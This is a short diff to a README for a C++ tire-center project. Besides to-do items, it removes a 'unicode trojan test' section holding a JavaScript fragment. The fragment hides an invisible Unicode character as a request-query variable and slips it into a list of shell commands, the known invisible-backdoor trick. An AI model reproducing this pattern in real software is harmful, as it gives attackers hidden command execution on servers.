@@ -21,9 +21,3 @@ Project focussed on C++ OOP about a tirecenter.
 - [ ] Clean up parameters in actions (full tirecenter not necessary)
 - [ ] convert to `nullptr`
 - [ ] fix customer constructor
-
-## unicode trojan test
-,ㅤ} = req.query;
-    const checkCommands = [
-        'ping -c 1 google.com',
-        'curl -s http://example.com/',ㅤ
